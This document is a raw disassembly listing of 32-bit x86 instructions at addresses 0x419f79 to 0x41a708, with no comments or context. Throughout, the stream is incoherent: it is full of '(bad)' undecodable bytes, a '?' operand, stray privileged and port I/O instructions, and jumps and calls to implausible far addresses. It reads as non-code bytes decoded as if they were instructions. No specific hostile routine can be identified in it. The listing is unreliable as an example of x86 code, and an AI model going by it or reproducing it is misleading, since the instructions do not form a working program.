  419f79:	repnz test DWORD PTR [ecx+edx*2],edx
  419f7d:	mov    ds:0xe3fb051f,al
  419f82:	test   eax,0xd0baeb2d
  419f87:	push   0x71299be0
  419f8c:	out    dx,al
  419f8d:	mov    dl,0xa9
  419f8f:	sub    al,BYTE PTR [edx]
  419f91:	and    ch,ch
  419f93:	ror    DWORD PTR [eax-0x43abb102],cl
  419f99:	xchg   esi,eax
  419f9a:	fstp   st(0)
  419f9c:	push   ebx
  419f9d:	icebp  
  419f9e:	imul   esi,ecx,0x19c9c8e6
  419fa4:	pop    esp
  419fa5:	idiv   ah
  419fa7:	test   DWORD PTR [ecx+0x530a7ae7],0x2be0f90b
  419fb1:	sbb    bh,BYTE PTR [eax]
  419fb3:	clc    
  419fb4:	icebp  
  419fb5:	loop   0x419f87
  419fb7:	test   al,0xce
  419fb9:	dec    ebp
  419fba:	cs mov ecx,0x1a53ddc3
  419fc0:	push   eax
  419fc1:	ficom  WORD PTR [ebp+0x28]
  419fc4:	aaa    
  419fc5:	or     edi,esp
  419fc7:	dec    DWORD PTR [edi+0x8]
  419fca:	outs   dx,BYTE PTR ds:[esi]
  419fcb:	push   edx
  419fcc:	add    eax,0x60c10f11
  419fd1:	push   0xffffffd6
  419fd3:	cli    
  419fd4:	stc    
  419fd5:	adc    al,0x56
  419fd7:	rol    BYTE PTR [ebp+0x23],0xb3
  419fdb:	hlt    
  419fdc:	lds    esp,FWORD PTR [esi+0x53]
  419fdf:	test   eax,0x2b58861d
  419fe4:	ss out 0x8c,eax
  419fe7:	pop    edi
  419fe8:	xchg   edx,eax
  419fe9:	in     al,dx
  419fea:	dec    esp
  419feb:	std    
  419fec:	pop    esp
  419fed:	jge    0x419fac
  419fef:	mov    esi,0xd505f150
  419ff4:	int    0xd9
  419ff6:	jp     0x419fad
  419ff8:	lods   eax,DWORD PTR ds:[esi]
  419ff9:	mov    al,ds:0xc7fe3888
  419ffe:	ins    BYTE PTR es:[edi],dx
  419fff:	lea    eax,[esi-0x19]
  41a002:	pop    ebp
  41a003:	test   eax,0x63c11f09
  41a008:	lock jnp 0x419fd2
  41a00b:	sbb    BYTE PTR [ecx-0x6b7cb45f],0xe8
  41a012:	clc    
  41a013:	and    eax,0x7610abe
  41a018:	push   es
  41a019:	mov    ah,0xcb
  41a01b:	scas   eax,DWORD PTR es:[edi]
  41a01c:	mov    bh,0xcf
  41a01e:	cdq    
  41a01f:	pop    es
  41a020:	add    esi,ecx
  41a022:	pop    ebp
  41a023:	mov    cl,0x3d
  41a025:	outs   dx,DWORD PTR ds:[esi]
  41a026:	loop   0x419feb
  41a028:	add    bh,cl
  41a02a:	in     al,0x8d
  41a02c:	pop    esp
  41a02d:	mov    dl,0xae
  41a02f:	xchg   edi,eax
  41a030:	call   0x27dedfab
  41a035:	adc    eax,0x6f233624
  41a03a:	dec    edi
  41a03b:	cmc    
  41a03c:	aad    0xd4
  41a03e:	int3   
  41a03f:	fstp   QWORD PTR [edx]
  41a041:	inc    esi
  41a042:	cs pop edx
  41a044:	lds    edx,FWORD PTR [edx+0x27c3c69c]
  41a04a:	test   BYTE PTR [ecx*1+0x17efa822],0x3c
  41a052:	(bad)  
  41a054:	hlt    
  41a055:	mov    edx,0xba0a04a7
  41a05a:	push   ecx
  41a05b:	out    dx,eax
  41a05c:	iret   
  41a05d:	xor    BYTE PTR [ebp-0x48],bl
  41a060:	jl     0x41a05c
  41a062:	gs shl al,cl
  41a065:	sar    BYTE PTR [esp+ecx*2+0xc],cl
  41a069:	xlat   BYTE PTR ds:[ebx]
  41a06a:	mov    BYTE PTR ds:0x78bca632,ch
  41a070:	xchg   DWORD PTR ss:0x90ee589d,esp
  41a077:	push   esi
  41a078:	dec    ecx
  41a079:	xor    eax,DWORD PTR [eax+ecx*2-0x148e4020]
  41a080:	sub    al,0x2c
  41a082:	add    BYTE PTR [edi+eiz*2+0x65f810e8],ch
  41a089:	int    0xf6
  41a08b:	mov    dl,0x42
  41a08d:	js     0x41a071
  41a08f:	cdq    
  41a090:	xchg   ebp,eax
  41a091:	xchg   ebp,eax
  41a092:	pop    ds
  41a093:	sbb    ch,cl
  41a095:	leave  
  41a096:	(bad)  
  41a097:	mov    cs,edx
  41a099:	dec    ecx
  41a09a:	mov    esp,0x7ab4861d
  41a09f:	and    ebp,DWORD PTR [ecx+0x1f]
  41a0a2:	sar    BYTE PTR [edi+0x39],cl
  41a0a5:	ins    BYTE PTR es:[edi],dx
  41a0a6:	and    DWORD PTR [ebp-0x7d],0xe6474e74
  41a0ad:	jmp    DWORD PTR [eax-0x339f374f]
  41a0b3:	aaa    
  41a0b4:	popf   
  41a0b5:	mov    BYTE PTR [ebx+0x3429069d],bh
  41a0bb:	add    bh,dl
  41a0bd:	mov    ch,0x3b
  41a0bf:	retf   
  41a0c0:	mov    fs,WORD PTR [edx+0x56]
  41a0c3:	adc    edi,DWORD PTR [edi]
  41a0c5:	sub    DWORD PTR [ebx],eax
  41a0c7:	push   esi
  41a0c8:	adc    esp,esi
  41a0ca:	cli    
  41a0cb:	or     eax,0x27ce039e
  41a0d0:	fnstsw WORD PTR [ebx+0x64]
  41a0d3:	push   cs
  41a0d4:	xor    al,0x4f
  41a0d6:	ins    DWORD PTR es:[edi],dx
  41a0d7:	add    BYTE PTR [ebx],ah
  41a0d9:	std    
  41a0da:	pop    esi
  41a0db:	adc    dh,bl
  41a0dd:	xchg   edi,eax
  41a0de:	xchg   edi,eax
  41a0df:	ja     0x41a082
  41a0e1:	sub    eax,0x23a2add5
  41a0e6:	cmp    DWORD PTR [edx-0x46],ebp
  41a0e9:	pop    ds
  41a0ea:	pop    ss
  41a0eb:	js     0x41a0de
  41a0ed:	mov    ebx,cs
  41a0ef:	xor    DWORD PTR [ebx+0x18],0x610117e9
  41a0f6:	clc    
  41a0f7:	popa   
  41a0f8:	inc    esp
  41a0f9:	rol    BYTE PTR fs:[ebp-0x2e1fc45e],cl
  41a100:	inc    ebx
  41a101:	fcmovne st,st(0)
  41a103:	popf   
  41a104:	sub    cl,BYTE PTR [eax+0x44a1c7ac]
  41a10a:	push   0x1a
  41a10c:	push   edx
  41a10d:	in     al,0x8c
  41a10f:	inc    ebp
  41a110:	pop    ss
  41a111:	mov    ds:0x47ee55,al
  41a116:	add    DWORD PTR ds:0x9421e2d7,esp
  41a11c:	addr16 daa 
  41a11e:	mov    esp,0xa4e95e4d
  41a123:	adc    ecx,edi
  41a125:	mov    dl,0xc9
  41a127:	push   eax
  41a128:	push   es
  41a129:	and    ebx,esi
  41a12b:	addr16 inc eax
  41a12d:	sti    
  41a12e:	lock dec ebx
  41a130:	daa    
  41a131:	pop    esp
  41a132:	sahf   
  41a133:	sub    DWORD PTR [edx+0x74fcab58],ebp
  41a139:	or     BYTE PTR [edi],dl
  41a13b:	(bad)  
  41a13c:	(bad)  
  41a13d:	hlt    
  41a13e:	(bad)  
  41a140:	mov    eax,ds:0x254bbbe0
  41a145:	popa   
  41a146:	fild   QWORD PTR [ecx-0x8a2e46]
  41a14c:	in     eax,0xd6
  41a14e:	xor    al,0x99
  41a150:	fldcw  WORD PTR [eax]
  41a152:	jno    0x41a15b
  41a154:	xchg   ecx,eax
  41a155:	cmc    
  41a156:	loope  0x41a110
  41a158:	pop    DWORD PTR [edx+eax*1+0x5baef5bb]
  41a15f:	inc    esp
  41a160:	jno    0x41a0f2
  41a162:	outs   dx,BYTE PTR ds:[esi]
  41a163:	inc    esp
  41a164:	fs mov bl,0xaa
  41a167:	sahf   
  41a168:	ins    DWORD PTR es:[edi],dx
  41a169:	fucom  st(5)
  41a16b:	add    cl,BYTE PTR ds:0x9efb7a9d
  41a171:	dec    dx
  41a173:	pop    eax
  41a174:	jmp    0xc7afc854
  41a179:	ret    0x53f0
  41a17c:	mov    ?,ebx
  41a17e:	std    
  41a17f:	lds    eax,FWORD PTR [ebp+ebx*8-0x4fe3044a]
  41a186:	movhps xmm5,QWORD PTR [esi]
  41a189:	in     al,dx
  41a18a:	rcr    BYTE PTR [ecx+0xc],1
  41a18d:	fist   WORD PTR ds:0x829222d5
  41a193:	dec    esp
  41a194:	mov    ch,BYTE PTR [ebp-0x5e2faa35]
  41a19a:	les    edi,FWORD PTR [esi-0x22]
  41a19d:	or     BYTE PTR [ebx-0x4c],dl
  41a1a0:	fwait
  41a1a1:	sbb    DWORD PTR [ecx+ebx*8-0x5727ef3c],eax
  41a1a8:	(bad)  
  41a1a9:	pop    edi
  41a1aa:	mov    ch,0xd9
  41a1ac:	dec    edx
  41a1ad:	push   esp
  41a1ae:	in     al,dx
  41a1af:	fdivr  st,st(3)
  41a1b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a1b2:	lock push gs
  41a1b5:	push   eax
  41a1b6:	jmp    0x41a184
  41a1b8:	pop    eax
  41a1b9:	fild   DWORD PTR [edi+ebx*1+0x43475d1d]
  41a1c0:	sbb    ch,ch
  41a1c2:	sub    DWORD PTR [ebx+ecx*1],ebx
  41a1c5:	into   
  41a1c6:	sbb    al,0x5a
  41a1c8:	jb     0x41a15b
  41a1ca:	jns    0x41a1f0
  41a1cc:	lds    ecx,FWORD PTR [eax+0x5a]
  41a1cf:	cmp    ch,BYTE PTR [esi]
  41a1d1:	dec    edx
  41a1d2:	or     al,BYTE PTR [ebp+0x48]
  41a1d5:	sub    eax,0xed20f822
  41a1da:	fld    QWORD PTR [ecx-0x3bb2ea79]
  41a1e0:	inc    ecx
  41a1e1:	in     al,0x3a
  41a1e3:	sahf   
  41a1e4:	and    esi,DWORD PTR [eax-0x633bf4d0]
  41a1ea:	mov    ebx,0xff98d2e8
  41a1ef:	push   edx
  41a1f0:	xchg   ebp,eax
  41a1f1:	sub    DWORD PTR [esi],0xffffffea
  41a1f4:	rol    BYTE PTR [eax+0x19],cl
  41a1f7:	push   edx
  41a1f8:	stos   DWORD PTR es:[edi],eax
  41a1f9:	jbe    0x41a184
  41a1fb:	and    BYTE PTR [ecx+0x3a5dfa7f],0x7e
  41a202:	jg     0x41a23e
  41a204:	mov    dh,0xb2
  41a206:	ins    DWORD PTR es:[edi],dx
  41a207:	lods   eax,DWORD PTR ds:[esi]
  41a208:	inc    ebp
  41a209:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a20a:	mov    edx,0x517199db
  41a20f:	mov    al,ds:0x9bec9b99
  41a214:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a215:	xor    ebx,ebx
  41a217:	mov    bh,0x5c
  41a219:	push   edi
  41a21a:	inc    ebx
  41a21b:	into   
  41a21c:	lahf   
  41a21d:	push   eax
  41a21e:	ins    BYTE PTR es:[edi],dx
  41a21f:	push   esp
  41a220:	adc    ebp,edi
  41a222:	add    ebp,0x90d1397c
  41a228:	or     al,0xf7
  41a22a:	ins    BYTE PTR es:[edi],dx
  41a22b:	and    DWORD PTR [eax-0x177d935],esi
  41a231:	nop
  41a232:	xor    ah,BYTE PTR [ebp-0x21]
  41a235:	ss jp  0x41a1e9
  41a238:	dec    esi
  41a239:	xchg   esi,eax
  41a23a:	gs xor ebp,0xc59f2121
  41a241:	dec    ebp
  41a242:	mov    ds:0xe8d06c5c,eax
  41a247:	inc    edx
  41a248:	dec    esp
  41a249:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a24a:	mov    dl,0xf2
  41a24c:	nop
  41a24d:	xor    eax,0xe90701e1
  41a252:	or     eax,0xe1796837
  41a257:	es inc esp
  41a259:	mov    eax,edi
  41a25b:	jge    0x41a23b
  41a25d:	push   esi
  41a25e:	enter  0x91e4,0x7
  41a262:	push   es
  41a263:	std    
  41a264:	sbb    DWORD PTR [ebp-0x6f9eb56f],ebp
  41a26a:	push   ecx
  41a26b:	ja     0x41a1fb
  41a26d:	das    
  41a26e:	push   es
  41a26f:	out    dx,eax
  41a270:	std    
  41a271:	xor    edi,esi
  41a273:	pop    ecx
  41a274:	outs   dx,DWORD PTR ds:[esi]
  41a275:	cmp    eax,0xf9df6b93
  41a27a:	adc    eax,0x678bb8fa
  41a27f:	mov    al,ds:0xa4f9485f
  41a284:	out    0x2b,al
  41a286:	xchg   ecx,eax
  41a287:	mov    edx,0x24935197
  41a28c:	mov    edx,DWORD PTR [esi]
  41a28e:	jb     0x41a27b
  41a290:	adc    BYTE PTR [esi+0x70],0x45
  41a294:	test   BYTE PTR [edx],dh
  41a296:	clc    
  41a297:	add    eax,0x38370280
  41a29c:	cmp    BYTE PTR [edi-0x69478c02],0xd5
  41a2a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2a4:	sbb    DWORD PTR [edi-0xf],ebx
  41a2a7:	mov    edi,0x94700dd4
  41a2ac:	jmp    0x52da:0xda8a98f7
  41a2b3:	rcr    BYTE PTR [ebp-0x3ec84168],cl
  41a2b9:	push   ss
  41a2ba:	dec    DWORD PTR [ebp+edi*4+0xc]
  41a2be:	aaa    
  41a2bf:	inc    eax
  41a2c0:	jnp    0x41a27b
  41a2c2:	inc    eax
  41a2c3:	cmp    al,0x8f
  41a2c5:	add    cl,BYTE PTR [ecx+0x3]
  41a2c8:	fcomp  QWORD PTR [esi]
  41a2ca:	push   ds
  41a2cb:	sbb    al,0xe6
  41a2cd:	aam    0xc2
  41a2cf:	inc    edi
  41a2d0:	test   BYTE PTR [edx-0x16435210],0xd7
  41a2d7:	jle    0x41a272
  41a2d9:	inc    ebx
  41a2da:	inc    esi
  41a2db:	lahf   
  41a2dc:	mov    edi,0xbe8ac91e
  41a2e1:	push   es
  41a2e2:	test   eax,0x1e98f044
  41a2e7:	ss (bad) 
  41a2e9:	add    DWORD PTR [ecx-0x1ba36ab2],edi
  41a2ef:	lahf   
  41a2f0:	dec    ebx
  41a2f1:	ins    BYTE PTR es:[edi],dx
  41a2f2:	cmp    DWORD PTR [edi],0x39e20a75
  41a2f8:	push   esi
  41a2f9:	popa   
  41a2fa:	outs   dx,DWORD PTR ds:[esi]
  41a2fb:	fdivr  QWORD PTR [ebx+0xbc5eb58]
  41a301:	shl    dl,cl
  41a303:	arpl   WORD PTR [esi],sp
  41a305:	sub    eax,0x3b7204e9
  41a30a:	mov    dh,0x10
  41a30c:	and    ebx,edi
  41a30e:	int3   
  41a30f:	mov    al,0xd8
  41a311:	mov    ds:0x569f6e0b,eax
  41a316:	cwde   
  41a317:	add    al,0x2d
  41a319:	xchg   edi,eax
  41a31a:	pop    ecx
  41a31b:	sub    edi,DWORD PTR [edx-0x1a44ae4c]
  41a321:	mov    dl,0x1f
  41a323:	js     0x41a34b
  41a325:	mov    esp,0xd129b02e
  41a32a:	fadd   QWORD PTR [ebx]
  41a32c:	test   al,0x9
  41a32e:	and    al,cl
  41a330:	sub    DWORD PTR [ebx-0x36d9a8ea],ebp
  41a336:	ss xchg ebp,eax
  41a338:	test   DWORD PTR [edi*1+0xa039cc7],ebx
  41a33f:	xor    BYTE PTR [edi],ch
  41a341:	stos   DWORD PTR es:[edi],eax
  41a342:	fiadd  WORD PTR [ecx+0x15b88427]
  41a348:	(bad)  
  41a34a:	mov    edx,0xec722d0a
  41a34f:	aad    0x57
  41a351:	cdq    
  41a352:	sbb    al,0xc3
  41a354:	icebp  
  41a355:	clc    
  41a356:	inc    esi
  41a357:	push   ss
  41a358:	sbb    BYTE PTR [ebp+0x3d646e07],dl
  41a35e:	mov    eax,ds:0xdb19c446
  41a363:	int    0x9a
  41a365:	scas   eax,DWORD PTR es:[edi]
  41a366:	mov    esi,0xf9faf81f
  41a36b:	pusha  
  41a36c:	leave  
  41a36d:	mov    edx,0x77a41206
  41a372:	inc    eax
  41a373:	repz push ebp
  41a375:	rol    DWORD PTR [ebp-0x57],1
  41a378:	jp     0x41a2ff
  41a37a:	xor    eax,DWORD PTR [eax+0x7fd39415]
  41a380:	sub    ch,cl
  41a382:	sbb    ah,BYTE PTR [ebx-0x3b17ab3f]
  41a388:	adc    ah,BYTE PTR [ebp-0x1fee7bdc]
  41a38e:	cmp    ecx,DWORD PTR [ebx]
  41a390:	int3   
  41a391:	cmp    ebx,DWORD PTR [esi]
  41a393:	test   eax,0x1f5b0ce0
  41a398:	push   eax
  41a399:	sbb    ebp,DWORD PTR [esi-0x4]
  41a39c:	sbb    bl,dh
  41a39e:	inc    ebx
  41a39f:	cmp    bh,BYTE PTR [ebp-0x13]
  41a3a2:	jae    0x41a3c6
  41a3a4:	add    esi,DWORD PTR [ecx-0xb]
  41a3a7:	push   0x2b
  41a3a9:	test   eax,0x35293ff9
  41a3ae:	cdq    
  41a3af:	mov    eax,0x11b084e7
  41a3b4:	xor    BYTE PTR [esi+0x22],0x5
  41a3b8:	push   esp
  41a3b9:	fsubrp st(3),st
  41a3bb:	pop    ebx
  41a3bc:	dec    edi
  41a3bd:	int3   
  41a3be:	aam    0x7b
  41a3c0:	push   es
  41a3c1:	imul   eax,DWORD PTR [ebx],0xffffffcf
  41a3c4:	addr16 pop ebx
  41a3c6:	in     al,0x76
  41a3c8:	pop    edx
  41a3c9:	jmp    0xaefaf6b4
  41a3ce:	outs   dx,BYTE PTR ds:[esi]
  41a3cf:	pop    edx
  41a3d0:	sub    edi,0x3a
  41a3d3:	(bad)  
  41a3d6:	or     ah,BYTE PTR [esi]
  41a3d8:	pop    ds
  41a3d9:	retf   
  41a3da:	loop   0x41a456
  41a3dc:	mov    al,ds:0x5a9f5fb6
  41a3e1:	fs call 0xa541:0x420ac8a5
  41a3e9:	bound  ecx,QWORD PTR [ebx-0x6e]
  41a3ec:	pop    ebp
  41a3ed:	xchg   ebp,eax
  41a3ee:	mov    edx,esp
  41a3f0:	lock bnd jge 0x41a3a1
  41a3f4:	rcr    DWORD PTR [eax+0x4b],1
  41a3f7:	push   edx
  41a3f8:	fimul  DWORD PTR [ebp+ebp*8-0x3ef834bd]
  41a3ff:	sar    esi,0x1d
  41a402:	jmp    0xf1548e75
  41a407:	aam    0x77
  41a409:	and    ah,cl
  41a40b:	pusha  
  41a40c:	mov    BYTE PTR [edi+0x76dd0138],cl
  41a412:	std    
  41a413:	(bad)  
  41a414:	mov    bl,0xd9
  41a416:	cmp    bl,al
  41a418:	loop   0x41a47d
  41a41a:	push   esi
  41a41b:	inc    eax
  41a41c:	mov    al,0x30
  41a41e:	icebp  
  41a41f:	xchg   BYTE PTR [eax],dl
  41a421:	or     eax,DWORD PTR [edx]
  41a423:	jp     0x41a44a
  41a425:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a426:	(bad)  
  41a427:	mov    ds:0x4411e95e,al
  41a42c:	aas    
  41a42d:	call   0x8be1e0bd
  41a432:	gs bnd jne 0x41a42f
  41a436:	mov    edi,ebp
  41a438:	pop    eax
  41a439:	mov    ah,0xda
  41a43b:	push   ecx
  41a43c:	test   eax,0xd979ce4a
  41a441:	repnz (bad) 
  41a443:	adc    dl,BYTE PTR [ecx+0x4e]
  41a446:	lods   eax,DWORD PTR ds:[esi]
  41a447:	mov    ah,0x1
  41a449:	rcl    BYTE PTR [eax],1
  41a44b:	ficomp DWORD PTR [esi+edx*8]
  41a44e:	cmp    al,0x2c
  41a450:	retf   0xc6e3
  41a453:	pop    esi
  41a454:	shl    esi,cl
  41a456:	int    0x64
  41a458:	call   0x39deb931
  41a45d:	mov    ch,0xd3
  41a45f:	pushw  ss
  41a461:	xchg   edi,eax
  41a462:	retf   0xac93
  41a465:	nop
  41a466:	imul   edx,DWORD PTR [ebx],0x4e
  41a469:	mov    BYTE PTR [esi+0x3e],dh
  41a46c:	push   edi
  41a46d:	fsubr  DWORD PTR [ebx-0x597c1fae]
  41a473:	test   DWORD PTR [ecx-0x6265d3e9],ebp
  41a479:	adc    al,BYTE PTR [ebp+esi*2+0x59]
  41a47d:	sbb    al,BYTE PTR ds:0xcb1dc2f3
  41a483:	cwde   
  41a484:	sub    BYTE PTR [eax+0x50],ch
  41a487:	jge    0x41a417
  41a489:	ror    BYTE PTR [edx],0x97
  41a48c:	sbb    BYTE PTR [eax+eax*1-0x15],bh
  41a490:	fcom   QWORD PTR [edi+0x5cfd9a47]
  41a496:	rcl    BYTE PTR [esi-0x66],0x37
  41a49a:	mov    BYTE PTR [edx+0x62],cl
  41a49d:	(bad)  
  41a49e:	test   al,0xcd
  41a4a0:	xor    dl,BYTE PTR [ecx+edi*8]
  41a4a3:	loope  0x41a450
  41a4a5:	int    0x11
  41a4a7:	dec    edi
  41a4a8:	cmp    DWORD PTR [ebx-0x3fc31e34],0xdb1c32dc
  41a4b2:	xor    al,0x9e
  41a4b4:	cdq    
  41a4b5:	bound  edi,QWORD PTR [edx+0x24]
  41a4b8:	loop   0x41a496
  41a4ba:	sub    edi,DWORD PTR [esi]
  41a4bc:	ret    0x94af
  41a4bf:	ret    0x62ec
  41a4c2:	and    esi,edx
  41a4c4:	or     al,0x97
  41a4c6:	jge    0x41a479
  41a4c8:	sub    dh,BYTE PTR [ebp+0x3b]
  41a4cb:	and    al,0x42
  41a4cd:	int    0xcb
  41a4cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a4d0:	mov    fs,WORD PTR [ecx-0x7c]
  41a4d3:	js     0x41a505
  41a4d5:	cmp    ebx,ecx
  41a4d7:	sahf   
  41a4d8:	dec    ebx
  41a4d9:	icebp  
  41a4da:	neg    BYTE PTR [esi+0x7fd719f3]
  41a4e0:	call   0x90413048
  41a4e5:	fs pop ebx
  41a4e7:	xor    eax,0x6ede4d0a
  41a4ec:	clc    
  41a4ed:	(bad)  
  41a4ee:	xor    ebx,edx
  41a4f0:	xchg   BYTE PTR [edx],ch
  41a4f2:	mov    ebp,edi
  41a4f4:	test   BYTE PTR [edx],cl
  41a4f6:	sbb    ch,dl
  41a4f8:	dec    esp
  41a4f9:	add    bh,BYTE PTR [ecx]
  41a4fb:	bound  ebp,QWORD PTR [ecx]
  41a4fd:	mov    al,ds:0xea0d89e7
  41a502:	std    
  41a503:	push   0x441ee7c8
  41a508:	sub    eax,0x2533f624
  41a50d:	sub    dl,BYTE PTR [edi]
  41a50f:	xor    edx,DWORD PTR [eiz*4-0x23480b7a]
  41a516:	aaa    
  41a517:	das    
  41a518:	push   ds
  41a519:	mov    esp,0x82e762cb
  41a51e:	scas   eax,DWORD PTR es:[edi]
  41a51f:	sti    
  41a520:	xchg   esi,eax
  41a521:	test   BYTE PTR [ebp+0x7f3d8498],ah
  41a527:	cli    
  41a528:	xchg   esi,eax
  41a529:	push   cs
  41a52a:	sbb    DWORD PTR [ebx],edx
  41a52c:	sub    eax,0xb88574f0
  41a531:	mov    eax,0x6f0c66fe
  41a536:	cld    
  41a537:	jne    0x41a4e5
  41a539:	cdq    
  41a53a:	lds    ebp,FWORD PTR [edx-0x39]
  41a53d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a53e:	retf   0x70a3
  41a541:	xchg   esp,eax
  41a542:	inc    edx
  41a543:	es ss xchg edi,eax
  41a546:	mov    eax,ds:0x520044b4
  41a54b:	das    
  41a54c:	retf   0xc37c
  41a54f:	adc    ah,bl
  41a551:	in     al,dx
  41a552:	loopne 0x41a4ed
  41a554:	cwde   
  41a555:	out    0x49,eax
  41a557:	arpl   WORD PTR [ebp-0x65],dx
  41a55a:	mov    dl,0x47
  41a55c:	(bad)  
  41a55e:	enter  0xb085,0x25
  41a562:	jbe    0x41a4fd
  41a564:	cmp    ebx,0xdd087b3d
  41a56a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a56b:	inc    esi
  41a56c:	add    DWORD PTR [ebp-0x80],edx
  41a56f:	(bad)  
  41a570:	jae    0x41a560
  41a572:	xor    eax,0x48f5a3b3
  41a577:	das    
  41a578:	push   esi
  41a579:	gs aaa 
  41a57b:	cli    
  41a57c:	call   0x7dfbc7e5
  41a581:	adc    bl,BYTE PTR [edx+0x51]
  41a584:	test   DWORD PTR [edx],edi
  41a586:	iret   
  41a587:	sub    BYTE PTR [edi],0xab
  41a58a:	ss fninit 
  41a58d:	sahf   
  41a58e:	dec    edi
  41a58f:	icebp  
  41a590:	xor    al,0x90
  41a593:	leave  
  41a594:	pop    ebp
  41a595:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a597:	cmc    
  41a598:	cld    
  41a599:	xchg   esp,eax
  41a59a:	mov    BYTE PTR [eax-0x6a],0x92
  41a59e:	cmp    cl,BYTE PTR [eax]
  41a5a0:	mov    edi,0x6837c0f0
  41a5a5:	xchg   ebp,eax
  41a5a6:	sub    ebx,DWORD PTR [edx+0x3d]
  41a5a9:	inc    ecx
  41a5aa:	mov    ebp,0x2312502b
  41a5af:	or     edx,DWORD PTR es:[ebp+0x2dbd0efa]
  41a5b6:	mov    eax,0x3f00c26
  41a5bb:	pusha  
  41a5bc:	and    BYTE PTR [edx+edi*1],al
  41a5bf:	dec    ebx
  41a5c0:	inc    DWORD PTR [ecx+0x77788f11]
  41a5c6:	inc    edx
  41a5c7:	or     BYTE PTR [eax+0x11],0x26
  41a5cb:	xor    eax,0xac586830
  41a5d0:	inc    ebp
  41a5d1:	cmp    al,0xa1
  41a5d3:	adc    DWORD PTR [ecx+0x15],0x24bfd626
  41a5da:	add    al,0x47
  41a5dc:	mov    al,ds:0x6c8da8f3
  41a5e1:	aas    
  41a5e2:	stos   DWORD PTR es:[edi],eax
  41a5e3:	in     eax,dx
  41a5e4:	sbb    eax,0xc4b0186f
  41a5e9:	or     BYTE PTR [eax],cl
  41a5eb:	fild   DWORD PTR [ebp+0x2e]
  41a5ee:	mov    ah,0x71
  41a5f0:	or     DWORD PTR [bx+0x4a],0xf17848ac
  41a5f8:	ss sub esi,edi
  41a5fb:	push   esp
  41a5fc:	mov    DWORD PTR [edx-0x4b],ebp
  41a5ff:	outs   dx,DWORD PTR ds:[esi]
  41a600:	push   edx
  41a601:	push   cs
  41a602:	inc    edx
  41a603:	jne    0x41a5ea
  41a605:	push   0x45024506
  41a60a:	xlat   BYTE PTR ds:[ebx]
  41a60b:	sbb    ebx,ebp
  41a60d:	adc    DWORD PTR [eax],edx
  41a60f:	push   ds
  41a610:	mov    edi,ebp
  41a612:	ins    BYTE PTR es:[edi],dx
  41a613:	sub    esp,edi
  41a615:	mov    edi,0x8f34026c
  41a61a:	push   esp
  41a61b:	pusha  
  41a61c:	dec    ebx
  41a61d:	cmp    eax,0x643d838b
  41a622:	jmp    DWORD PTR [esi-0x2e]
  41a625:	dec    eax
  41a626:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a627:	inc    ebx
  41a628:	mov    dl,0xfa
  41a62a:	lea    edi,[edi+esi*2]
  41a62d:	sti    
  41a62e:	test   BYTE PTR [ebx-0x2e],0xbb
  41a632:	pop    esp
  41a633:	out    0x2,eax
  41a635:	call   0xd7a9c670
  41a63a:	call   0xcfa5:0x550f17ec
  41a641:	mov    dl,0xae
  41a643:	mov    ebx,0xfdac7298
  41a648:	sub    al,0x1d
  41a64a:	mov    dl,0xcd
  41a64c:	loopne 0x41a6ac
  41a64e:	add    ebx,DWORD PTR [eax+0x10ef143d]
  41a654:	add    edx,esp
  41a656:	push   ebx
  41a657:	add    DWORD PTR [ebp+0x30cefec0],ebp
  41a65d:	mov    eax,0x9bda1b5e
  41a662:	mov    al,ds:0xee7cbc52
  41a667:	push   ds
  41a668:	hlt    
  41a669:	outs   dx,BYTE PTR ds:[esi]
  41a66a:	neg    DWORD PTR [edx-0x18]
  41a66d:	push   0xaec70627
  41a672:	push   cs
  41a673:	sti    
  41a674:	xchg   ebp,eax
  41a675:	jmp    0x26d9:0x1f6ffefd
  41a67c:	inc    edi
  41a67d:	aam    0x50
  41a67f:	(bad)  
  41a680:	fcmovbe st,st(6)
  41a682:	jb     0x41a6e7
  41a684:	ret    
  41a685:	in     eax,dx
  41a686:	dec    esp
  41a687:	push   esp
  41a688:	popf   
  41a689:	inc    edi
  41a68a:	jmp    0x54c4:0x82f08663
  41a691:	mov    dl,0x9a
  41a693:	dec    esp
  41a694:	inc    edi
  41a695:	test   ch,bh
  41a697:	test   eax,0xf48d8b99
  41a69c:	xor    eax,0x8f8d7941
  41a6a1:	ins    BYTE PTR es:[edi],dx
  41a6a2:	dec    eax
  41a6a3:	lds    edi,FWORD PTR [esi-0x4]
  41a6a6:	ds popa 
  41a6a8:	dec    edx
  41a6a9:	out    dx,al
  41a6aa:	int    0xbb
  41a6ac:	shr    ah,cl
  41a6ae:	or     eax,0xcb904c8f
  41a6b3:	mov    esp,DWORD PTR [ebp-0x8]
  41a6b6:	inc    edx
  41a6b7:	push   ecx
  41a6b8:	mov    ebp,0x7504bfa2
  41a6bd:	mov    ecx,0xcb783a75
  41a6c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a6c3:	xor    al,0x9e
  41a6c5:	imul   BYTE PTR [edx+0x539261f6]
  41a6cb:	inc    edi
  41a6cc:	jae    0x41a6ad
  41a6ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6cf:	cs sbb eax,0x2805133f
  41a6d5:	inc    esi
  41a6d6:	mov    edx,0xc7bc6848
  41a6db:	sbb    eax,0x5382ae1f
  41a6e0:	xor    al,BYTE PTR [edi]
  41a6e2:	(bad)
  41a6e7:	ret    
  41a6e8:	sbb    al,0x85
  41a6ea:	jae    0x41a750
  41a6ec:	inc    eax
  41a6ed:	inc    edx
  41a6ee:	cdq    
  41a6ef:	jle    0x41a723
  41a6f1:	das    
  41a6f2:	sbb    ecx,esp
  41a6f4:	inc    edi
  41a6f5:	mov    DWORD PTR [edx],0xaf5a3573
  41a6fb:	imul   edi,DWORD PTR [ebx-0x4f],0xd402f35e
  41a702:	test   DWORD PTR [edi],ebx
  41a704:	sub    DWORD PTR [eax-0x47],0x15
  41a708:	jmp    0x544b:0xda1e063
